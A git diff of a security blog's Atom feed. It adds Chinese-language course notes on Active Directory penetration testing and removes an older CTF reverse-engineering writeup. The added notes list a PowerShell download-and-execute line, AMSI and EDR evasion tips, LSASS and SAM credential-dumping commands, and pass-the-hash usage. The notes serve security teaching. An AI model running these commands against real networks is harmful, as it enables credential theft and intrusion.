@@ -6,7 +6,7 @@
   <link href="https://kazma.tw/atom.xml" rel="self"/>
   
   <link href="https://kazma.tw/"/>
-  <updated>2024-12-25T10:53:44.379Z</updated>
+  <updated>2025-05-20T07:09:28.101Z</updated>
   <id>https://kazma.tw/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>NCKUCTF XY Active Directory Note</title>
+    <link href="https://kazma.tw/2025/05/20/NCKUCTF-XY-Active-Directory-Note/"/>
+    <id>https://kazma.tw/2025/05/20/NCKUCTF-XY-Active-Directory-Note/</id>
+    <published>2025-05-20T06:56:49.000Z</published>
+    <updated>2025-05-20T07:09:28.101Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul><li><a class="link"   href="https://www.youtube.com/live/Ez9wdb1xbH0?si=8vBlfS89edrzH0P0" >上課直播 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://drive.google.com/file/d/1UMmRrpeN64ePyfwHQCpexvalGJBpVoVr/view" >課前說明 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://drive.google.com/file/d/1Yf516U3Z0lyGvuBxzWsXOq5qwd-HLAH6/view" >課程資源 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://drive.google.com/file/d/1M0_C5CaFtuxB5gOPfV7lqYrICOz9vsyZ/view" >課堂簡報 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>以上資源大家可以備份保存，不確定講師之後會保留多久～</li></ul><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/forest.png"                      alt="forest"                ></p><ul><li>Forest<ul><li>Domain(ex: corp.local)<ul><li>Domain Controller<ul><li>AD DS</li><li>各種服務：LDAP、SMB、Kerberos、DNS、NTP</li></ul></li><li>第一個 domain -&gt; forest root domain</li></ul></li><li>Domain(ex: tw.corp.local)</li></ul></li></ul><h2 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h2><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><ul><li>AS-REQ(請求 TGT)<ul><li>用 client’s secret key(從密碼衍伸) 加密 timestamp (pre-quthentication)</li></ul></li><li>AS-REP(頒發 TGT)<ul><li>DC 用 client’s secret key 解開 timestamp 驗證</li><li>頒發的 TGT 以 krbtgt’s secret key 加密</li></ul></li><li>TGS-REQ(請求 ST, service ticket)<ul><li>包含取得的 TGT 和目標 SPN</li></ul></li><li>TGS-REP(頒發 ST)<ul><li>DC 用 krbtgt’s secret key 解開 TGT 驗證資訊</li><li>頒發 ST 以 Server’s secret key 加密</li></ul></li><li>AP-REQ(存取服務)<ul><li>包含 ST</li><li>Server 解密 ST 驗證資訊</li></ul></li><li>AP-REP(Optional)<ul><li>雙向驗證時需要</li></ul></li><li>常見登入方式<ul><li>console</li><li>SMB<ul><li>445 port</li><li>檔案存取</li><li>預設 share<ul><li>ADMIN$</li><li>C$</li><li>IPC$</li></ul></li></ul></li><li>RDP<ul><li>3389 port</li></ul></li><li>WinRM<ul><li>5985, 5986 port </li><li>類似 ssh </li><li>PSRemoting 預設 transport</li></ul></li></ul></li><li>Logon Types <ul><li>Interactive logon (console)</li><li>Network logon (SMB, WinRM)</li><li>Batch logon</li><li>Service logon</li><li>NetworkCleartext logon</li><li>RemoteInteractive (RDP)</li><li><a class="link"   href="https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types" >參考資料 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul></li><li>常見工具<ul><li>BloodHound: AD 圖形化工具<ul><li>可以進到 neo4j 下 <code>MATCH (n:User) RETURN n.description</code> 來查看所有使用者的描述</li></ul></li><li>BloodHound.py: python collector<ul><li>遠端搜集，不需落地</li><li><code>bloodhound-python -c All -d corp.local -v -u user@corp.local -ns 10.10.10.10 -dc dc1.corp.local --zip</code></li></ul></li><li>PowerShell<ul><li>Getting help: -?</li><li>Get-Member</li><li>Get-Command<ul><li>-Noun</li><li>-Verb</li></ul></li><li>ActiveDirectory module<ul><li>裝 DC 時候就有附帶</li><li>微軟爸爸 signed 的 DLL</li><li>Microsoft.ActiveDirectory.Management.dll<ul><li>C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management</li></ul></li></ul></li><li>PowerView: PowerShell recon 工具<ul><li><a class="link"   href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" >https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>實作多個網域查詢功能</li><li>額外滲透用功能<ul><li>Invoke-UserHunter, Find-LocalAdminAccess</li></ul></li><li><code>iex (iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1)</code><ul><li>直接執行會被 AMSI 阻擋<ul><li>Antimalware Scan INterface<ul><li>偵測 PowerShell、JScript、VBA、.NET</li></ul></li><li>AMSI Bypass<ul><li>檢查哪部分會觸發 AMSI，以便我們修改</li><li><a class="link"   href="https://github.com/RythmStick/AMSITrigger" >https://github.com/RythmStick/AMSITrigger <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li>.\AmsiTrigger.exe -i .\PowerView.ps1</li><li>可以用 <code>. .\PowerView.ps1</code> 載入模組</li><li>其他 bypass 手法<ul><li><a class="link"   href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file" >https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/powerview.png"                      alt="powerview"                ></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li><li>netexec: 內網滲透神器</li><li>impacket: Python library 實作很多 network protocols<ul><li>強大的 example scripts</li></ul></li></ul></li></ul><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><ul><li>蒐集 domain、domain controller 等資訊<ul><li><code>echo $env:USERDNSDOMAIN</code></li><li>PowerView<ul><li><code>Get-Domain</code></li><li><code>Get-DomainController</code></li></ul></li></ul></li><li>蒐集 forest 資訊<ul><li>PowerView<ul><li><code>Get-Forest</code></li></ul></li></ul></li><li>Trust<ul><li>可存取的 domain</li><li>防禦強度</li><li>價值</li><li><code>nltest.exe /domain_trusts</code></li><li>PowerView<ul><li><code>Get-DomainTrust</code></li></ul></li><li>Trust Type<ul><li>方向<ul><li>單向、雙向</li></ul></li><li>遞移性 (Transitivity)<ul><li>預設同 forest 有遞移性</li></ul></li><li>類型<ul><li>Parent-child、tree-root、external</li></ul></li></ul></li></ul></li><li>User<ul><li>權限<ul><li>Local admin、Group、ACL</li></ul></li><li>高權限使用者</li><li>登入的機器</li><li>UserAccountControl</li><li>Description</li><li>本機帳戶</li><li>指令<ul><li><code>net.exe user /domain</code></li><li>Find computers where a specified user has session<ul><li><code>Invoke-UserHunter</code></li></ul></li><li>Find computers where the current user has local admin access<ul><li><code>Find-LocalAdminAccess</code></li></ul></li><li>PowerView<ul><li><code>Get-DomainUser</code></li><li><code>Get-DomainUser -Identity &lt;USERNAME&gt; -Properties *</code></li></ul></li></ul></li></ul></li><li>Group<ul><li>群組中有哪些使用者</li><li>擁有的權限</li><li>一些高權限群組<ul><li>Enterprise Admins<ul><li>forest 的管理者，只存在 root domain</li></ul></li><li>Schema Admins<ul><li>修改 AD 中的 schema</li></ul></li><li>Print Operators<ul><li>可登入 DC</li></ul></li><li>Domain Admins<ul><li>domain 管理者</li></ul></li><li>Account Operators<ul><li>可修改 AD 中的 schema</li></ul></li><li>Server Operators<ul><li>可管理 DC</li></ul></li><li>DNSAdmins<ul><li>可用 SYSTEM 權限在 DC 執行任意 DLL</li></ul></li><li>Backup Operators<ul><li>備份 &amp; 還原 DC 檔案</li></ul></li><li>Remote Desktop Users<ul><li>可 RDP 登入 DC</li></ul></li></ul></li><li>指令<ul><li><code>net.exe group /domain</code></li><li>PowerView<ul><li><code>Get-DomainGroup</code></li><li><code>Get-DomainGroupMember -Identity &lt;GROUP_NAME&gt;</code></li></ul></li></ul></li></ul></li><li>Computer<ul><li>功能 ex: database</li><li>delegation</li><li>連線方式</li><li>Domain Controller<ul><li>DCSync</li></ul></li><li>指令<ul><li><code>Get-DomainComputer</code></li><li><code>Get-DomainController</code></li></ul></li></ul></li><li>Service<ul><li>Service Principal Name (SPN)<ul><li>唯一的識別碼</li><li>格式：service&#x2F;computer[:port][&#x2F;path]<ul><li>e.g., host&#x2F;DC01</li></ul></li></ul></li><li>跑了什麼服務<ul><li>高價值服務 or 潛在目標</li></ul></li><li>SPN 設定在 user -&gt; Kerberoasting</li></ul></li><li>ACL<ul><li>Access Control List (ACL)<ul><li>一連串 Access Control Entries (ACE)</li></ul></li><li>種類<ul><li>DACL: 定義誰可存取資源及可執行的操作</li><li>SACL: 定義系統記錄哪些對資源的存取嘗試 (audit 用)</li></ul></li><li>Security Descriptors<ul><li>SID (security identifier)</li><li>DACL</li><li>SACL</li></ul></li><li>物件擁有的權限</li><li>指令<ul><li><code>(Get-Acl -Path &#39;AD:&lt;DISTINGUISHED_NAME&gt;&#39;).Access</code></li><li>PowerView<ul><li><code>Get-DomainObjectAcl -Identity &lt;OBJECT&gt; -ResolveGUIDs</code></li></ul></li></ul></li></ul></li><li>NTLM Info<ul><li>取得主機名稱、網域等資訊</li><li>掃多台容易觸發告警</li><li>指令<ul><li><code>DumpNTLMInfo.py 10.10.10.10</code></li><li><code>netexec smb 192.168.56.0/24</code></li><li><code>netexec smb --shares</code><ul><li>不帶帳密 -&gt; anonymous shares</li></ul></li></ul></li></ul></li><li>Active Directory Integrated DNS (ADIDNS)<ul><li>預設一般使用者可讀取 DNS records</li><li>有機會拉到一堆域名</li></ul></li></ul><h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><ul><li>Credential Dumping e.g., NT Hash、Kerberos Key&#x2F;Ticket<ul><li>獲取其他使用者的機密資訊</li><li>通常需要本機提權</li><li>常見 dump 技巧<ul><li>Registry hives<ul><li>又稱為 SAM Dump</li><li>HKLM\SAM: 儲存本機使用者資訊 e.g. 密碼</li><li>HKLM\SECURITY: 儲存 LSA policy &amp; secrets</li><li>HKLM\SYSTEM: 儲存 LSA system key 用於解密</li><li>指令<ul><li><code>reg.exe save hklm\sam sam.save /y</code><ul><li>被 edr 擋掉可以 hklm -&gt; HKEY_LOCAL_MACHINE</li><li><a class="link"   href="https://argfuscator.net/" >https://argfuscator.net/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul></li><li><code>secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></li></ul></li><li>遠端操作<ul><li>避免指令觸發 EDR<ul><li><code>secretsdump.py DOMAIN/USERNAME:PASSWORD@COMPUTER</code><ul><li>對 DC 還會做 DCSync</li></ul></li><li><code>regsecrets.py DOMAIN/USERNAME:PASSWORD@COMPUTER</code></li></ul></li></ul></li></ul></li><li>LSASS<ul><li>可用工作管理員、Sysinternals 的 ProcDump 等方式來 dump memory<ul><li><a class="link"   href="https://lolbas-project.github.io/#/dump" >https://lolbas-project.github.io/#/dump <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul></li><li>透過 Mimikatz 或 pypykatz 等工具從 dump 檔案抽取 hashes &amp; tickets</li><li>指令<ul><li><code>.\prodump.exe -accepteula -ma lsass.exe lsass.dmp</code></li><li><code>pypykatz lsa minidumpp lsass.dmp</code></li></ul></li></ul></li><li>DPAPI<ul><li>方便使用的加解密 API<ul><li>Windows 負責儲存金鑰</li><li>System master keys: 儲存於 LSA Secret</li></ul></li><li>列 credential<ul><li><code>vaultcmd /listcreds:&quot;Windows Credentials&quot; /all</code></li></ul></li><li>遠端 RPC 操作<ul><li><a class="link"   href="https://github.com/login-securite/DonPAPI" >https://github.com/login-securite/DonPAPI <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul></li></ul></li></ul></li></ul></li><li>Pass the Hash<ul><li>NTLM 認證</li><li>攻擊者只需要 NT Hash 便可認證為 client<ul><li>透過 Credential Dumping 技巧</li></ul></li><li>Impacket -hashes 參數<ul><li>格式：<code>LMHASH:NTHASH</code></li><li><code>smbclient.py corp.local/administrator@dc01.corp.local -hashes:161d918d191d98f4019f23</code></li></ul></li></ul></li><li>撞 Local Admin 帳密<ul><li>LAPS 有開嗎</li><li>同網斷多台 windows 機器是相同管理者</li><li>可能共用本機管理者帳密</li><li>指令<ul><li><code>netexec smb 192.168.56.0/24 -u Administrator -H 12990f1j293f8293ff12938f --local-auth</code></li></ul></li></ul></li><li>Pass the Ticket <ul><li>Kerberos Ticket 通常 cache 在 LSASS 中<ul><li>由 LSASS dump 取得</li></ul></li><li>利用竊取的 Kerberos Ticket 偽裝成該使用者以存取服務</li><li>ticketConverter.py 轉換票據格式<ul><li>kirbi -&gt; ccache</li></ul></li></ul></li><li>Overpass the Hash <ul><li>用 NT Hash 來請求有效 TGT </li><li>當環境只允許 Kerveros Authentication 時會有幫助</li></ul></li><li>PS Remoting <ul><li>允許使用者連線到遠端機器執行指令</li><li>Windows Server 上預設開啟</li><li>指令<ul><li><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/psremoting.png"                      alt="psremoting"                ></li></ul></li><li>WinRM 工具<ul><li><a class="link"   href="https://github.com/Hackplayers/evil-winrm" >https://github.com/Hackplayers/evil-winrm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul></li></ul></li><li>Impacket *exe.py<ul><li><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/impacket.png"                      alt="impacket"                ></li></ul></li></ul><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h2 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h2>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Resources&quot;&gt;&lt;a href=&quot;#Resources&quot; class=&quot;headerlink&quot; title=&quot;Resources&quot;&gt;&lt;/a&gt;Resources&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&quot;link&quot;   href=&quot;https://www.</summary>
+      
+    
+    
+    
+    
+    <category term="note" scheme="https://kazma.tw/tags/note/"/>
+    
+    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
+    
+    <category term="ad" scheme="https://kazma.tw/tags/ad/"/>
+    
+  </entry>
   
   <entry>
     <title>AngelBoy Windows Kernel Exploitation Note</title>
@@ -35,11 +62,11 @@
     
     
     
+    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
+    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="note" scheme="https://kazma.tw/tags/note/"/>
-    
-    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
     
     <category term="kernel" scheme="https://kazma.tw/tags/kernel/"/>
     
@@ -91,13 +118,13 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
-    <category term="note" scheme="https://kazma.tw/tags/note/"/>
-    
     <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="shellcoding" scheme="https://kazma.tw/tags/shellcoding/"/>
+    
+    <category term="note" scheme="https://kazma.tw/tags/note/"/>
     
   </entry>
   
@@ -119,9 +146,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="ret2lib" scheme="https://kazma.tw/tags/ret2lib/"/>
     
@@ -145,9 +172,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="bof" scheme="https://kazma.tw/tags/bof/"/>
     
@@ -171,9 +198,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="windbg" scheme="https://kazma.tw/tags/windbg/"/>
     
@@ -197,13 +224,13 @@
     
     
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="egg-hunting" scheme="https://kazma.tw/tags/egg-hunting/"/>
     
@@ -229,11 +256,11 @@
     
     
     
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
     <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
-    
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
     
@@ -260,9 +287,9 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="migration" scheme="https://kazma.tw/tags/migration/"/>
     
@@ -287,9 +314,9 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="oob-write" scheme="https://kazma.tw/tags/oob-write/"/>
     
@@ -313,13 +340,13 @@
     
     
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
   </entry>
   
@@ -342,13 +369,13 @@
     
     
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
   </entry>
   
@@ -370,13 +397,13 @@
     
     
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="retlibc" scheme="https://kazma.tw/tags/retlibc/"/>
     
@@ -401,13 +428,13 @@
     
     
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="fmt-write" scheme="https://kazma.tw/tags/fmt-write/"/>
     
@@ -558,35 +585,6 @@
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="crypto" scheme="https://kazma.tw/tags/crypto/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HackTheBox-Challenges FlagCasino Writeup</title>
-    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/"/>
-    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-FlagCasino-Writeup/</id>
-    <published>2024-11-01T09:16:21.217Z</published>
-    <updated>2024-11-01T09:35:16.321Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這是一題逆向，因為程式不長就直接放上來：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input; <span class="comment">// [rsp+Bh] [rbp-5h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** WELCOME TO ROBO CASINO **]&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;     ,     ,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    (\\____/)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     (_oo_)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;       (O)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;     __||__    \\)\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  []/______\\[] /\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  / \\______/ \\/\n&quot;</span></span><br><span class="line">    <span class="string">&quot; /    /__\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(\\   /____\\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*** PLEASE PLACE YOUR BETS ***]&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1D</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot; %c&quot;</span>, &amp;input) != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    srand(input);</span><br><span class="line">    <span class="keyword">if</span> ( rand() != check[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ * INCORRECT * ]&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[ *** ACTIVATING SECURITY SYSTEM - PLEASE VACATE *** ]&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[ * CORRECT *]&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[ ** HOUSE BALANCE $0 - PLEASE COME BACK LATER ** ]&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>上面是 ida 反編譯的主程式邏輯，總之我們就是要連續輸入正確的亂數種子來符合 check 陣列裡的值，所以就是一個 flag checker，這裡我們來撰寫 exploit 來算出對應的亂數種子。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    libc.srand(i)</span><br><span class="line">    mapping[libc.rand()] = <span class="built_in">chr</span>(i)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">casino = ELF(<span class="string">&quot;./casino&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    val = casino.u32(casino.sym[<span class="string">&quot;check&quot;</span>] + b * <span class="number">4</span>)</span><br><span class="line">    flag += mapping[val]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>首先我們載入 <code>ctypes</code> 讓 python 可以呼叫 C 標準函式庫中的函數。<br>然後使用 ctypes.CDLL 函數來加載 Linux 的 C 標準函式庫 libc.so.6，這樣加載後的 libc 物件就可以直接呼叫 C 標準庫中的函數，例如題目中用到的 srand() 和 rand()。<br>然後我們遞迴 ascii 的範圍建一個字典，再來我們可以透過 ida 觀察到 check 陣列觀察到有 30 個 4 bytes，所以這裡我們可以把 casino 用 pwntools 載進來之後透過 u32 以及一次移動我們的指針四個單位來找到對應的隨機種子，最後印出我們的 flag。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ file casino                                          ─╯</span><br><span class="line">casino: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7618b017ef4299337610a90a0a6ccb7f9efc44a4, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/casino_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee" >https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這是一題逆向，因為程式不長就直接放上來：&lt;/p&gt;
-&lt;div </summary>
-      
-    
-    
-    
-    
-    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
-    
-    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
-    
-    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
-    
-    <category term="rev" scheme="https://kazma.tw/tags/rev/"/>
     
   </entry>
   
